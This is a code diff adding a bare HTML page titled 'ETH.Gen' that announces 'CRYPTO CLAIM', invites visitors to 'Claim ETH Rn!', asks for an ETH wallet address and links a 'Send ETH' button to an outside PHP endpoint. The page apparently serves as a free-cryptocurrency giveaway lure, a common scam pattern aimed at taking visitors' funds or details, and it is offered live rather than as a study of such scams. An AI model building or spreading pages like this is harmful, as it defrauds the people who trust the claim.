@@ -1,0 +1,61 @@
+<title> ETH.Gen </title>
+<link rel="stylesheet" href="styles.css">
+<style>
+  
+  .l-design-widht {
+  max-width: 40rem;
+  padding: 1rem;
+}
+  
+  
+.input {
+  position: relative;
+  
+  &__label {
+    position: absolute;
+    left: 0;
+    top: 0;
+    padding: calc(var(--size-bezel) * 0.75) calc(var(--size-bezel) * .5);
+    margin: calc(var(--size-bezel) * 0.75 + 3px) calc(var(--size-bezel) * .5);
+    background: pink;
+    white-space: nowrap;
+    transform: translate(0, 0);
+    transform-origin: 0 0;
+    background: var(--color-background);
+    transition: transform 120ms ease-in;
+    font-weight: bold;
+    line-height: 1.2;
+  }
+  &__field {
+    box-sizing: border-box;
+    display: block;
+    width: 100%;
+    border: 3px solid currentColor;
+    padding: calc(var(--size-bezel) * 1.5) var(--size-bezel);
+    color: currentColor;
+    background: transparent;
+    border-radius: var(--size-radius);
+    
+    &:focus,
+    &:not(:placeholder-shown) {
+      & + .input__label {
+        transform: translate(.25rem, -65%) scale(.8);
+        color: var(--color-accent);
+      }
+    }
+  }
+}
+</style>
+<h1> CRYPTO CLAIM </h1>
+<p> Claim ETH Rn! </p>
+<br>
+<br>
+<br>
+    <label class="input">
+      <input class="input__field" type="text" placeholder=" " />
+      <span class="input__label">ETH Wallet</span>
+    </label>
+<a href="https://blagdoi.site/eth-process.php" class="myButton"> Send ETH </a>
+<br>
+<br>
+<br>
